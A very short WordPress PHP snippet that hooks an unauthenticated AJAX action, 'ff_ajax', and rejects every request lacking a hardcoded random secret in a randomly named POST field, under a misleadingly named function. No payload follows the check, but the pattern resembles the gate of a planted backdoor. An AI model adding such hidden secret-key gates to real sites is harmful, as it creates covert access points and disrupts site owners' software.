<?php

function tracking_src_index() {
	if (!isset($_POST["wnebqkgjasef"]) || $_POST["wnebqkgjasef"] !== "oEgCDHLlacgw") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'tracking_src_index', 5, 1);
